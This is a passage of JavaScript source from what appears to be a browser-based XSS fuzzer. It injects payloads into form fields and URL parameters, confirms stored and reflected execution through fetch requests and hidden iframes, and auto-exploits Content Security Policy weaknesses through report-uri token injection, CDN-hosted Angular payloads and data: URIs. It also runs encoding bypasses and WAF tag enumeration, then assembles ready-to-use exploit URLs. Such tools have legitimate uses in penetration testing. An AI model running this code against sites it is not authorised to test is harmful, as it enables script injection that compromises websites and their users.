          ns.log.info(`   🎯 Input: %c${sv.name}`, 'color:#00ddff;font-weight:bold');

          // Build original values map
          const origVals = new Map();
          for (const fv of vectors.filter(fv => fv.type === 'input' && fv.element?.form === form)) {
            if (fv.element?.name) origVals.set(fv.element.name, fv.originalValue || '');
          }

          const allInputs = form.querySelectorAll('input[name], textarea[name], select[name]');
          // Preserve hidden field values (not in vectors since excluded from Phase 1 selector)
          for (const inp of allInputs) {
            if (inp.type === 'hidden' && inp.name && !origVals.has(inp.name)) {
              origVals.set(inp.name, inp.value || inp.defaultValue || '');
            }
          }
          const actionUrl = new URL(form.action || location.href, location.href);
          const origTarget = form.target || '';

          for (let j = 0; j < toTest.length; j++) {
            const p = toTest[j];
            totalAttempts++;
            const tag = p.isEncodingBypass ? '\uD83D\uDD04' : '\uD83D\uDCA3';
            ns.log.info(`\n   ${tag} %c[${j + 1}/${toTest.length}] ${p.desc}`, 'color:#ffaa00');
            ns.log.info(`      %c${truncate(p.payload, 120)}`, 'font-family:monospace;color:#ccc;background:#1a1a1a;padding:2px 4px;font-size:11px');

            // Restore form DOM values, set target to payload, fill empties
            for (const inp of allInputs) {
              if (inp.type === 'submit' || inp.type === 'file') continue;
              const origVal = origVals.get(inp.name);
              inp.value = (origVal !== undefined && origVal !== '') ? origVal : (inp.defaultValue || '');
            }
            sv.element.value = p.payload;
            for (const inp of allInputs) {
              if (inp === sv.element || inp.type === 'hidden' || inp.type === 'submit' ||
                  inp.type === 'file' || inp.type === 'checkbox' || inp.type === 'radio') continue;
              if (!inp.value) inp.value = getFillerValue(inp);
            }

            // Submit form via fetch (more reliable for stored XSS than iframe)
            let submitIframe = null;
            try {
              // Build form data with restored values + payload
              const formDataP3 = new FormData(form);
              let postRespHtml = null;
              let postRespUrl = null;
              try {
                const postResp = await fetch(actionUrl.toString(), {
                  method: 'POST',
                  body: new URLSearchParams(formDataP3),
                  credentials: 'same-origin',
                  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                  redirect: 'follow',
                });
                if (postResp.status >= 400) {
                  const errBody = await postResp.text();
                  const errSnippet = errBody.replace(/<[^>]+>/g, ' ').trim().substring(0, 80);
                  ns.log.info(`      ⛔ Server rejected payload (HTTP ${postResp.status}): "${errSnippet}"`);
                  continue; // Skip — payload was not accepted/stored
                }
                postRespHtml = await postResp.text();
                postRespUrl = postResp.url;
              } catch {
                // Fallback: iframe submit
                const iframeName = `__domxss_p3_${Date.now()}`;
                submitIframe = document.createElement('iframe');
                submitIframe.name = iframeName;
                submitIframe.style.cssText = 'position:fixed;left:-9999px;top:-9999px;width:1px;height:1px;opacity:0;pointer-events:none';
                document.body.appendChild(submitIframe);
                form.target = iframeName;
                const submitDone = new Promise(resolve => {
                  submitIframe.onload = () => resolve(true);
                  submitIframe.onerror = () => resolve(false);
                  setTimeout(() => resolve(false), CONFIG.delays.longTimeout);
                });
                form.submit();
                const loaded = await submitDone;
                if (loaded && submitIframe.contentDocument) {
                  try { postRespHtml = submitIframe.contentDocument.documentElement.outerHTML; } catch (e) { ns.log.debug(e.message); }
                }
              }

              const checkPL = p.isEncodingBypass ? (p.rawPayload || p.payload) : p.payload;
              let foundHtml = null;
              let foundWhere = '';

              // Check 1: POST response (direct or redirect target)
              if (postRespHtml && isPayloadReflected(checkPL, postRespHtml)) {
                foundHtml = postRespHtml;
                foundWhere = 'POST response';
              }

              // Check 2: fetch the current page (stored XSS appears on view page)
              if (!foundHtml) {
                await new Promise(r => setTimeout(r, CONFIG.delays.betweenTests));
                try {
                  const viewResp = await fetch(location.href, {
                    credentials: 'same-origin',
                    headers: { 'Accept': 'text/html', 'Cache-Control': 'no-cache' },
                    cache: 'reload',
                  });
                  if (viewResp.ok) {
                    const viewHtml = await viewResp.text();
                    if (isPayloadReflected(checkPL, viewHtml)) {
                      foundHtml = viewHtml;
                      foundWhere = 'stored (current page)';
                    }
                  }
                } catch (e) { ns.log.debug(e.message); }
              }

              // Check 3: if POST redirected elsewhere, fetch that URL too
              if (!foundHtml && postRespUrl && postRespUrl !== location.href) {
                try {
                  const redirResp = await fetch(postRespUrl, {
                    credentials: 'same-origin',
                    headers: { 'Accept': 'text/html', 'Cache-Control': 'no-cache' },
                    cache: 'reload',
                  });
                  if (redirResp.ok) {
                    const redirHtml = await redirResp.text();
                    if (isPayloadReflected(checkPL, redirHtml)) {
                      foundHtml = redirHtml;
                      foundWhere = 'stored (redirect target)';
                    }
                  }
                } catch (e) { ns.log.debug(e.message); }
              }

              // Check 4: Stored DOM XSS — GET the form action URL
              // (same endpoint often serves both POST=submit and GET=retrieve)
              if (!foundHtml) {
                try {
                  const csrfLike = /csrf|token|nonce|verification|viewstate|_method|honeypot|utf8/i;
                  const getUrl = new URL(actionUrl.toString());
                  for (const [k, v] of new URL(location.href).searchParams) {
                    if (!getUrl.searchParams.has(k)) getUrl.searchParams.set(k, v);
                  }
                  for (const inp of allInputs) {
                    if (inp.type === 'hidden' && inp.name && !getUrl.searchParams.has(inp.name) && !csrfLike.test(inp.name)) {
                      getUrl.searchParams.set(inp.name, inp.value || inp.defaultValue || '');
                    }
                  }
                  const getResp = await fetch(getUrl.toString(), {
                    credentials: 'same-origin',
                    headers: { 'Accept': '*/*', 'Cache-Control': 'no-cache' },
                    cache: 'reload',
                  });
                  if (getResp.ok) {
                    const getText = await getResp.text();
                    if (isPayloadReflected(checkPL, getText)) {
                      foundHtml = getText;
                      foundWhere = `stored (GET ${getUrl.pathname})`;
                    }
                  }
                } catch (e) { ns.log.debug(e.message); }
              }

              if (foundHtml) {
                totalConfirmed++;
                confirmedSources.add(srcName);
                const realPL = resolveRealPayload(p, r.analysis);
                ns.log.info(`      %c\u2705 STORED XSS CONFIRMED`, 'color:#00ff00;font-weight:bold;font-size:14px');
                ns.log.info(`      %cPayload: ${realPL}`, 'color:#00ff00;font-family:monospace;font-size:12px');
                ns.log.info(`      %cField: %c${sv.element?.name || sv.name}%c \u2192 form POST \u2192 ${actionUrl.pathname}`, 'color:#888', 'color:#00ddff;font-weight:bold', 'color:#888');
                ns.log.info(`      %cFound in: ${foundWhere}`, 'color:#888');
                fuzzResults.confirmed.push({
                  context: r.context, payload: realPL, realPayload: realPL,
                  desc: p.desc + ' (stored XSS via POST)',
                  source: srcName, type: 'stored-xss-post',
                  formAction: actionUrl.toString(), inputName: sv.element?.name,
                });
                break;
              } else {
                ns.log.info(`      \u274C Payload encoded/filtered`);
              }
            } catch (e) {
              ns.log.info(`      \u26A0\uFE0F Error: ${e.message}`);
            } finally {
              form.target = origTarget;
              if (submitIframe && submitIframe.parentNode) {
                try { submitIframe.parentNode.removeChild(submitIframe); } catch (e) { ns.log.debug(e.message); }
              }
            }
          }
          continue;
        }

        if (formMethod === 'GET') {
          const payloads = selectVerifyPayloads(r.context, r.analysis.survived, { ...r.analysis.encodings, __partiallyEncoded: r.analysis.partiallyEncoded || [], __strippedKeywords: r.analysis.strippedKeywords || [] });
          if (payloads.length === 0) {
            ns.log.info('   %c\u26AB No hay payloads viables para este contexto + chars supervivientes', 'color:#888');
            continue;
          }
          const toTest = payloads.slice(0, opts.maxPayloadsPerReflection);
          ns.log.info(`   ${toTest.length} payload(s) a verificar v\u00eda fetch (form GET)`);
          ns.log.info(`   \uD83C\uDFAF Input: %c${sv.name}`, 'color:#00ddff;font-weight:bold');

          for (let j = 0; j < toTest.length; j++) {
            const p = toTest[j];
            totalAttempts++;

            const tag = p.isEncodingBypass ? '\uD83D\uDD04' : '\uD83D\uDCA3';
            ns.log.info(`\n   ${tag} %c[${j + 1}/${toTest.length}] ${p.desc}`, 'color:#ffaa00');
            ns.log.info(`      %c${truncate(p.payload, 120)}`, 'font-family:monospace;color:#ccc;background:#1a1a1a;padding:2px 4px;font-size:11px');

            // Construir URL: payload en target, originales en el resto
            const testUrl = new URL(form.action || location.href, location.href);
            const formInputs = form.querySelectorAll('input[name], textarea[name], select[name]');
            for (const inp of formInputs) {
              if (inp.name === sv.element.name) {
                testUrl.searchParams.set(inp.name, p.payload);
              } else {
                // Restaurar valor original (no vacio, para que csrf etc. funcione)
                const vec = vectors.find(fv => fv.type === 'input' && fv.element === inp);
                testUrl.searchParams.set(inp.name, vec?.originalValue || inp.defaultValue || '');
              }
            }

            try {
              const resp = await fetch(testUrl.toString(), { credentials: 'same-origin' });
              if (!resp.ok) { ns.log.info('      \u274C HTTP error'); continue; }
              const html = await resp.text();

              // Verificar si el payload aparece sin encodear en la respuesta
              // Para encoding bypasses, check the RAW (decoded) form — encoded
              // strings appearing in response just means the server echoed them,
              // not that they execute as HTML/JS.
              const checkPayload = p.isEncodingBypass ? (p.rawPayload || p.payload) : p.payload;
              const payloadReflected = isPayloadReflected(checkPayload, html);

              if (payloadReflected) {
                totalConfirmed++;
                const exploitUrl = new URL(testUrl);
                const basePayload = p.rawPayload || p.payload;
                const realPayload = resolveRealPayload({ ...p, payload: basePayload }, r.analysis);

                // URL exploit limpia: solo el param vulnerable
                const realUrl = new URL(form.action || location.href, location.href);
                realUrl.searchParams.set(sv.element.name, realPayload);

                const result = {
                  reflectionIndex: i + 1,
                  context: r.context,
                  payload: p.payload,
                  realPayload,
                  desc: p.desc + ' (reflected via fetch)',
                  element: r.element,
                  source: srcName,
                  bypass: p.bypass,
                  isEncodingBypass: !!p.isEncodingBypass,
                  verifyId: p.verifyId,
                  exploitUrl: realUrl.toString(),
                };
                fuzzResults.confirmed.push(result);
                confirmedSources.add(srcName);

                ns.log.info(`      %c✅ REFLECTED UNENCODED`, 'color:#00ff00;font-weight:bold;font-size:13px');
                const cleanPL = resolveRealPayload({ ...p, payload: checkPayload }, r.analysis);
                ns.log.info(`      %cPayload: ${cleanPL}`, 'color:#00ff00;font-family:monospace;font-size:12px');
                ns.log.info(`      %c🔗 ${realUrl.toString()}`, 'color:#4488ff;font-family:monospace');

                // Highlight input source en cyan
                if (sv.element && !markedInputs.has(sv.element)) {
                  markedInputs.add(sv.element);
                  highlightEl(sv.element, `\uD83D\uDD35 SOURCE \u2192 XSS confirmado`, 'fuzz-src');
                  connectedInputs++;
                }

                try { delete window[`__xss_${p.verifyId}`]; } catch (e) { ns.log.debug(e.message); }
                break;
              } else {
                ns.log.info(`      \u274C Payload encoded/filtrado en respuesta`);
                // Mostrar lo que queda del payload
                const idx = html.indexOf(p.verifyId);
                if (idx !== -1) {
                  const snippet = html.substring(Math.max(0, idx - 40), Math.min(html.length, idx + 80));
                  ns.log.info(`      \uD83D\uDCCB Snippet: %c${truncate(snippet, 120)}`, 'color:#888;font-family:monospace;font-size:11px');
                }
              }
            } catch (e) {
              ns.log.info(`      \u26A0\uFE0F Fetch error: ${e.message}`);
            }
          }
          continue; // Skip normal injection path
        }
      }

      const payloads = selectVerifyPayloads(r.context, r.analysis.survived, { ...r.analysis.encodings, __partiallyEncoded: r.analysis.partiallyEncoded || [], __strippedKeywords: r.analysis.strippedKeywords || [] });

      if (payloads.length === 0) {
        ns.log.info('   %c\u26AB No hay payloads viables para este contexto + chars supervivientes', 'color:#888');
        continue;
      }

      const toTest = payloads.slice(0, opts.maxPayloadsPerReflection);
      ns.log.info(`   ${toTest.length} payload(s) a probar (de ${payloads.length} posibles)`);

      // Determinar en que vectores inyectar:
      //  - Si conocemos el sourceVector -> solo en ese (mas preciso, mas rapido)
      //  - Si no -> todos los vectores (fallback)
      const targetVectors = sv ? [sv] : vectors;
      if (sv) {
        ns.log.info(`   \uD83C\uDFAF Inyectando solo en: %c${sv.name}`, 'color:#00ddff;font-weight:bold');
      }

      for (let j = 0; j < toTest.length; j++) {
        const p = toTest[j];
        totalAttempts++;

        const tag = p.isEncodingBypass ? '\uD83D\uDD04' : '\uD83D\uDCA3';
        ns.log.info(`\n   ${tag} %c[${j + 1}/${toTest.length}] ${p.desc}`, 'color:#ffaa00');
        ns.log.info(`      %c${truncate(p.payload, 120)}`, 'font-family:monospace;color:#ccc;background:#1a1a1a;padding:2px 4px;font-size:11px');

        // Inyectar el payload en el/los vector(es) relevante(s)
        for (const v of targetVectors) {
          await injectAndWait(v, p.payload, opts.delayBetweenTests, _extScriptCache);
        }

        // Verificar si el payload se ejecuto
        let executed = false;
        try { executed = p.check(); } catch (e) { ns.log.debug(e.message); }

        if (executed) {
          totalConfirmed++;
          const result = {
            reflectionIndex: i + 1,
            context: r.context,
            payload: p.payload,
            realPayload: p.realPayload || null,
            desc: p.desc,
            element: r.element,
            source: srcName,
            bypass: p.bypass,
            isEncodingBypass: !!p.isEncodingBypass,
            verifyId: p.verifyId,
          };
          fuzzResults.confirmed.push(result);
          confirmedSources.add(srcName);

          const cleanPLDom = resolveRealPayload(p, r.analysis);
          ns.log.info(`      %c✅ XSS CONFIRMED`, 'color:#00ff00;font-weight:bold;font-size:14px');
          ns.log.info(`      %cPayload: ${cleanPLDom}`, 'color:#00ff00;font-family:monospace;font-size:12px');
          if (p.bypass) ns.log.info(`      %cBypass: ${p.bypass}`, 'color:#ff6600');

          // Highlight confirmado: verde neon en el reflejo
          if (r.domElement) highlightEl(r.domElement, `\u2705 XSS CONFIRMADO: ${r.context}`, 'fuzz-xss');

          // Limpiar la variable de verificacion
          try { delete window[`__xss_${p.verifyId}`]; } catch (e) { ns.log.debug(e.message); }

          // Si confirmo, no seguir probando este reflejo
          break;
        } else {
          ns.log.info(`      \u274C No ejecutado`);

          // Limpiar
          try { delete window[`__xss_${p.verifyId}`]; } catch (e) { ns.log.debug(e.message); }

          // Si no ejecuto pero era viable, verificar si el reflejo aun existe
          // (podria ser que el payload cambio el DOM)
          const refCanary = (sv && sv.canary) ? sv.canary : masterCanary;
          const stillReflected = findReflections({
            ...refCanary,
            base: p.verifyId,
            full: p.payload,
          });

          if (stillReflected.length > 0) {
            const sr = stillReflected[0];
            // Chars del payload sobrevivieron? Log para debugging
            const keychars = ['<', '>', '"', "'", '(', ')', ';', '`'];
            const surv = keychars.filter(c => (sr.analysis?.survived || []).includes(c));
            if (surv.length > 0) {
              ns.log.info(`      \uD83D\uDCCB Payload reflejado. Chars raw: %c${surv.join(' ')}`, 'color:#00ff00');
              ns.log.info('         Puede requerir interacci\u00f3n del usuario (click, hover, focus)');
            } else {
              ns.log.info('      \uD83D\uDCCB Payload reflejado pero chars clave est\u00e1n encoded/stripped');
            }
          }
        }
      }
    }

    // ===================================
    // CSP BYPASS PHASE — auto-exploit CSP weaknesses
    // ===================================
    // When payloads are reflected but not executed and CSP blocks inline scripts,
    // run full CSP analysis and auto-test exploitable bypasses.
    if (totalConfirmed === 0 && cspInfo?.blocksInline && reflections.length > 0) {
      ns.log.info('\n%c\u2550\u2550 CSP BYPASS — Auto-exploiting Content Security Policy \u2550\u2550', 'font-weight:bold;color:#00aaff;font-size:13px');
      ns.log.info('   Payloads reflected but CSP blocks execution. Testing bypasses...');

      // Run full CSP analysis (reuses cached HEAD request)
      let cspResult = null;
      try {
        cspResult = await ns.fuzzer.detectCSP();
      } catch (e) { ns.log.debug('CSP analysis error: ' + e.message); }

      if (cspResult?.found && cspResult.bypasses.length > 0) {
        // Find a reflection with a URL param source for testing
        const urlReflection = reflections.find(r => {
          const sv = r.sourceVector;
          return sv && sv.type === 'url-param' && r.context === 'html-body';
        });

        if (urlReflection) {
          const sv = urlReflection.sourceVector;

          for (const bypass of cspResult.bypasses) {
            if (totalConfirmed > 0) break;
            if (!bypass.payload) continue;

            // --- report-uri token injection bypass ---
            if (bypass.condition === 'report-uri') {
              ns.log.info(`\n   %c\uD83D\uDEE1\uFE0F Testing: ${bypass.desc}`, 'color:#ff6600;font-weight:bold');

              // Extract param names from report-uri URL
              const reportUriMatch = cspResult.csp.match(/report-uri\s+([^\s;]+)/i);
              const tokenParams = [];
              if (reportUriMatch) {
                try {
                  const reportUrl = new URL(reportUriMatch[1], location.origin);
                  for (const key of reportUrl.searchParams.keys()) tokenParams.push(key);
                } catch (e) { /* relative URL or parse error */ }
              }
              if (tokenParams.length === 0) tokenParams.push('token'); // fallback

              for (const tokenParam of tokenParams) {
                const verifyId = Math.random().toString(36).substring(2, 6);
                const scriptPayload = `<script>window.__xss_${verifyId}=1</script>`;

                const testUrl = new URL(location.origin + location.pathname);
                for (const [k, val] of savedOriginalParams) testUrl.searchParams.set(k, val);
                testUrl.searchParams.set(sv.param, scriptPayload);
                // Inject CSP directive override via token parameter
                testUrl.searchParams.set(tokenParam, ";script-src-elem 'unsafe-inline'");

                ns.log.info(`      %c<script>alert(1)</script>&${tokenParam}=;script-src-elem 'unsafe-inline'`, 'font-family:monospace;color:#ccc;font-size:11px');

                let iframe = null;
                try {
                  iframe = document.createElement('iframe');
                  iframe.style.cssText = 'position:fixed;left:-9999px;top:-9999px;width:1px;height:1px;opacity:0;pointer-events:none';
                  iframe.sandbox = 'allow-same-origin allow-scripts';
                  const loaded = new Promise(resolve => {
                    iframe.onload = () => resolve(true);
                    iframe.onerror = () => resolve(false);
                    setTimeout(() => resolve(false), CONFIG.delays.verifyTimeout);
                  });
                  iframe.src = testUrl.toString();
                  document.body.appendChild(iframe);
                  const ok = await loaded;

                  if (ok && iframe.contentWindow) {
                    await new Promise(r => setTimeout(r, 400));
                    if (iframe.contentWindow[`__xss_${verifyId}`]) {
                      totalConfirmed++;
                      const realPayload = '<script>alert(1)</script>';
                      const exploitUrl = new URL(testUrl);
                      exploitUrl.searchParams.set(sv.param, realPayload);

                      fuzzResults.confirmed.push({
                        type: 'reflected',
                        context: 'html-body (CSP bypass)',
                        source: sv.name,
                        param: sv.param,
                        payload: realPayload,
                        realPayload,
                        desc: `CSP bypass: ${bypass.desc}`,
                        bypass: `${tokenParam}=;script-src-elem 'unsafe-inline'`,
                        exploitUrl: exploitUrl.toString(),
                      });
                      ns.log.info(`      %c\u2705 CSP BYPASS XSS CONFIRMED via ${tokenParam} injection!`, 'color:#00ff00;font-weight:bold;font-size:14px');
                      ns.log.info(`      %c\uD83D\uDD17 ${exploitUrl.toString()}`, 'color:#00ff00;font-family:monospace');
                      break;
                    } else {
                      ns.log.info(`      \u274C Token "${tokenParam}" injection did not bypass CSP`);
                    }
                  }
                } catch (e) { ns.log.debug('CSP bypass iframe error: ' + e.message); }
                finally {
                  if (iframe?.parentNode) try { iframe.parentNode.removeChild(iframe); } catch (e) {}
                }
              }
            }

            // --- CDN-based bypasses (Angular CSTI via whitelisted CDN) ---
            if (totalConfirmed === 0 && bypass.payload?.includes('<script src=')) {
              ns.log.info(`\n   %c\uD83D\uDEE1\uFE0F Testing: ${bypass.desc}`, 'color:#ff6600;font-weight:bold');

              const verifyId = Math.random().toString(36).substring(2, 6);
              // Replace alert(1) with verification marker in Angular CSTI payload
              const cdnPayload = bypass.payload
                .replace(/alert\s*\(\s*1\s*\)/g, `window.__xss_${verifyId}=1`);

              const testUrl = new URL(location.origin + location.pathname);
              for (const [k, val] of savedOriginalParams) testUrl.searchParams.set(k, val);
              testUrl.searchParams.set(sv.param, cdnPayload);

              ns.log.info(`      %c${truncate(bypass.payload, 120)}`, 'font-family:monospace;color:#ccc;font-size:11px');

              let iframe = null;
              try {
                iframe = document.createElement('iframe');
                iframe.style.cssText = 'position:fixed;left:-9999px;top:-9999px;width:1px;height:1px;opacity:0;pointer-events:none';
                iframe.sandbox = 'allow-same-origin allow-scripts';
                const loaded = new Promise(resolve => {
                  iframe.onload = () => resolve(true);
                  iframe.onerror = () => resolve(false);
                  setTimeout(() => resolve(false), CONFIG.delays.verifyTimeout + 3000); // extra time for CDN load
                });
                iframe.src = testUrl.toString();
                document.body.appendChild(iframe);
                const ok = await loaded;

                if (ok && iframe.contentWindow) {
                  await new Promise(r => setTimeout(r, 2000)); // AngularJS needs time to bootstrap
                  if (iframe.contentWindow[`__xss_${verifyId}`]) {
                    totalConfirmed++;
                    const exploitUrl = new URL(testUrl);
                    exploitUrl.searchParams.set(sv.param, bypass.payload);

                    fuzzResults.confirmed.push({
                      type: 'reflected',
                      context: 'html-body (CSP bypass)',
                      source: sv.name,
                      param: sv.param,
                      payload: bypass.payload,
                      realPayload: bypass.payload,
                      desc: `CSP bypass: ${bypass.desc}`,
                      bypass: bypass.condition,
                      exploitUrl: exploitUrl.toString(),
                    });
                    ns.log.info(`      %c\u2705 CSP BYPASS XSS CONFIRMED via ${bypass.condition}!`, 'color:#00ff00;font-weight:bold;font-size:14px');
                    ns.log.info(`      %c\uD83D\uDD17 ${exploitUrl.toString()}`, 'color:#00ff00;font-family:monospace');
                  } else {
                    ns.log.info(`      \u274C CDN payload did not execute (CSP may block external domain)`);
                  }
                }
              } catch (e) { ns.log.debug('CDN bypass iframe error: ' + e.message); }
              finally {
                if (iframe?.parentNode) try { iframe.parentNode.removeChild(iframe); } catch (e) {}
              }
            }

            // --- data: URI bypass ---
            if (totalConfirmed === 0 && bypass.condition === 'data:') {
              ns.log.info(`\n   %c\uD83D\uDEE1\uFE0F Testing: ${bypass.desc}`, 'color:#ff6600;font-weight:bold');

              const verifyId = Math.random().toString(36).substring(2, 6);
              const dataPayload = `<script src="data:text/javascript,window.__xss_${verifyId}=1"></script>`;

              const testUrl = new URL(location.origin + location.pathname);
              for (const [k, val] of savedOriginalParams) testUrl.searchParams.set(k, val);
              testUrl.searchParams.set(sv.param, dataPayload);

              let iframe = null;
              try {
                iframe = document.createElement('iframe');
                iframe.style.cssText = 'position:fixed;left:-9999px;top:-9999px;width:1px;height:1px;opacity:0;pointer-events:none';
                iframe.sandbox = 'allow-same-origin allow-scripts';
                const loaded = new Promise(resolve => {
                  iframe.onload = () => resolve(true);
                  iframe.onerror = () => resolve(false);
                  setTimeout(() => resolve(false), CONFIG.delays.verifyTimeout);
                });
                iframe.src = testUrl.toString();
                document.body.appendChild(iframe);
                const ok = await loaded;

                if (ok && iframe.contentWindow) {
                  await new Promise(r => setTimeout(r, 400));
                  if (iframe.contentWindow[`__xss_${verifyId}`]) {
                    totalConfirmed++;
                    fuzzResults.confirmed.push({
                      type: 'reflected',
                      context: 'html-body (CSP bypass)',
                      source: sv.name, param: sv.param,
                      payload: bypass.payload, realPayload: bypass.payload,
                      desc: `CSP bypass: ${bypass.desc}`,
                      bypass: 'data: URI',
                      exploitUrl: testUrl.toString().replace(`window.__xss_${verifyId}=1`, 'alert(1)'),
                    });
                    ns.log.info(`      %c\u2705 CSP BYPASS XSS CONFIRMED via data: URI!`, 'color:#00ff00;font-weight:bold;font-size:14px');
                  } else {
                    ns.log.info(`      \u274C data: URI blocked by CSP`);
                  }
                }
              } catch (e) { ns.log.debug('data: bypass iframe error: ' + e.message); }
              finally {
                if (iframe?.parentNode) try { iframe.parentNode.removeChild(iframe); } catch (e) {}
              }
            }
          }
        }

        if (totalConfirmed === 0) {
          ns.log.info('\n   %c\u26A0\uFE0F CSP bypasses detected but none confirmed automatically.', 'color:#ffaa00');
          ns.log.info('   %cRun %cdomxss.fuzz.csp()%c for manual analysis', 'color:#888', 'color:#ff00ff;font-weight:bold', 'color:#888');
        }
      }
    }

    // ===================================
    // FASE 5: Bypasses de encoding (si nada funciono)
    // ===================================
    if (totalConfirmed === 0 && opts.tryEncodingBypasses && reflections.length > 0) {
      ns.log.info('\n%c\u2550\u2550 FASE 5: Encoding bypasses \u2550\u2550', 'font-weight:bold;color:#00aaff;font-size:13px');
      ns.log.info('   Los payloads directos no funcionaron. Intentando bypasses de encoding...');

      for (let i = 0; i < reflections.length; i++) {
        const r = reflections[i];
        if (r.analysis.encoded.length === 0 && r.analysis.stripped.length === 0) continue;

        ns.log.info(`\n%c\u2500\u2500 Reflejo #${i + 1}: Encoding bypasses \u2500\u2500`, 'font-weight:bold;color:#ff6600');

        // Obtener los payloads base que no tenian chars suficientes
        const ctxPayloads = VERIFY_PAYLOADS[r.context] || [];
        let bypAssAttempts = 0;

        for (const p of ctxPayloads) {
          if (bypAssAttempts >= 3) break; // Limitar intentos

          const vId = Math.random().toString(36).substring(2, 6);
          const rawPayload = p.payload(vId);
          const bypasses = prioritizeBypasses(generateEncodingBypasses(rawPayload, r.analysis.encodings), r.analysis.encodings);

          for (const bp of bypasses.slice(0, 2)) {
            bypAssAttempts++;
            totalAttempts++;
            ns.log.info(`   \uD83D\uDD04 %c${bp.technique}`, 'color:#ffaa00');
            ns.log.info(`      %c${truncate(bp.payload, 100)}`, 'font-family:monospace;color:#888;font-size:11px');

          for (const v of (r.sourceVector ? [r.sourceVector] : vectors)) {
              await injectAndWait(v, bp.payload, opts.delayBetweenTests, _extScriptCache);
            }

            let executed = false;
            try { executed = p.check(vId); } catch (e) { ns.log.debug(e.message); }

            if (executed) {
              totalConfirmed++;
              const result = {
                reflectionIndex: i + 1,
                context: r.context,
                payload: bp.payload,
                desc: `${p.desc} + ${bp.technique}`,
                element: r.element,
                bypass: bp.technique,
                isEncodingBypass: true,
                verifyId: vId,
              };
              fuzzResults.confirmed.push(result);
              fuzzResults.bypasses.push(result);

              const cleanPLBypass = resolveRealPayload({ payload: bp.payload }, r.analysis);
              ns.log.info(`      %c✅ XSS CONFIRMED (bypass: ${bp.technique})`, 'color:#00ff00;font-weight:bold;font-size:14px');
              ns.log.info(`      %cPayload: ${cleanPLBypass}`, 'color:#00ff00;font-family:monospace;font-size:12px');

              // Highlight verde neon en el reflejo confirmado
              const ref = reflections[i];
              if (ref && ref.domElement) highlightEl(ref.domElement, `\u2705 XSS BYPASS: ${bp.technique}`, 'fuzz-xss');
              try { delete window[`__xss_${vId}`]; } catch (e) { ns.log.debug(e.message); }
              break;
            }
            try { delete window[`__xss_${vId}`]; } catch (e) { ns.log.debug(e.message); }
          }
          if (totalConfirmed > 0) break;
        }
      }
    }

    // ===================================
    // AUTO WAF ENUMERATION
    // ===================================
    // When reflections exist but no XSS confirmed, and html-body reflections
    // have < surviving (tags are echoed but specific ones may be blocked),
    // auto-trigger WAF tag/event enumeration to discover allowed combos.
    if (totalConfirmed === 0 && reflections.length > 0) {
      const wafCandidates = reflections.filter(r => {
        if (r.context !== 'html-body') return false;
        const sv = r.sourceVector;
        if (!sv || sv.type !== 'url-param') return false;
        const survived = r.analysis?.survived || [];
        return survived.includes('<');
      });

      if (wafCandidates.length > 0 && typeof ns.fuzzer.wafEnumerate === 'function') {
        const v = wafCandidates[0].sourceVector;
        ns.log.info('\n%c\uD83D\uDEE1\uFE0F Standard payloads failed but < survives \u2014 running WAF tag/event enumeration...', 'color:#ff6600;font-weight:bold');

        try {
          const wafResult = await ns.fuzzer.wafEnumerate({
            paramName: v.param,
            delayMs: opts.delayBetweenTests,
          });

          if (wafResult && wafResult.payloads && wafResult.payloads.length > 0) {
            // wafEnumerate now returns pre-verified payloads
            for (const wafPayload of wafResult.payloads) {
              const exploitUrl = new URL(location.origin + location.pathname);
              for (const [k, val] of savedOriginalParams) exploitUrl.searchParams.set(k, val);
              exploitUrl.searchParams.set(v.param, wafPayload.payload);
              if (wafPayload.needsHash) exploitUrl.hash = 'x';

              totalConfirmed++;
              fuzzResults.confirmed.push({
                type: 'reflected',
                context: 'html-body (WAF bypass)',
                source: v.name,
                param: v.param,
                payload: wafPayload.payload,
                realPayload: wafPayload.payload,
                desc: 'WAF bypass via tag/event enumeration (execution verified)',
                bypass: `allowed: ${wafResult.allowedTags?.slice(0, 5).join(', ')}`,
                exploitUrl: exploitUrl.toString(),
              });
              ns.log.info(`%c\uD83D\uDD25 WAF BYPASS XSS CONFIRMED: ${wafPayload.payload}`, 'color:#ff0000;font-weight:bold;font-size:14px');
            }
          }

          // Handle reflected-only payloads: report interaction-required ones as findings
          if (wafResult && wafResult.reflectedOnly && wafResult.reflectedOnly.length > 0) {
            for (const rp of wafResult.reflectedOnly) {
              if (rp.combo?.needsInteraction) {
                const exploitUrl = new URL(location.origin + location.pathname);
                for (const [k, val] of savedOriginalParams) exploitUrl.searchParams.set(k, val);
                exploitUrl.searchParams.set(v.param, rp.payload);
                if (rp.needsHash) exploitUrl.hash = 'x';

                totalConfirmed++;
                fuzzResults.confirmed.push({
                  type: 'reflected',
                  context: 'html-body (WAF bypass, needs click)',
                  source: v.name,
                  param: v.param,
                  payload: rp.payload,
                  realPayload: rp.payload,
                  desc: 'WAF bypass — SVG animate href (reflected, needs user click)',
                  bypass: `allowed: ${wafResult.allowedTags?.slice(0, 5).join(', ')}`,
                  exploitUrl: exploitUrl.toString(),
                  needsInteraction: true,
                });
                ns.log.info(`%c\uD83D\uDD25 WAF BYPASS XSS (needs click): ${rp.payload}`, 'color:#ff6600;font-weight:bold;font-size:14px');
              } else {
                ns.log.info(`   \u26A0\uFE0F WAF bypass reflected but not confirmed: ${rp.payload}`);
              }
            }
          }
        } catch (e) { ns.log.debug('WAF enum error: ' + e.message); }
      }
    }

    // ===================================
    // RESULTADO FINAL
    // ===================================
    ns.log.info('\n%c\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550', 'color:#ff00ff');

    if (totalConfirmed > 0) {
      ns.log.info(`%c✅ ${totalConfirmed} XSS CONFIRMED`, 'font-size:16px;font-weight:bold;color:#00ff00;background:#002200;padding:8px 12px');
      ns.log.info('');
      for (const c of fuzzResults.confirmed) {
        // Clean exploit payload and URL
        const cleanPayload = c.realPayload || c.payload || '';
        let exploitUrl = c.exploitUrl || '';
        if (!exploitUrl && c.param) {
          const u = new URL(location.origin + location.pathname);
          for (const [k, val] of savedOriginalParams) u.searchParams.set(k, val);
          u.searchParams.set(c.param, cleanPayload);
          exploitUrl = u.toString();
        } else if (!exploitUrl && c.source) {
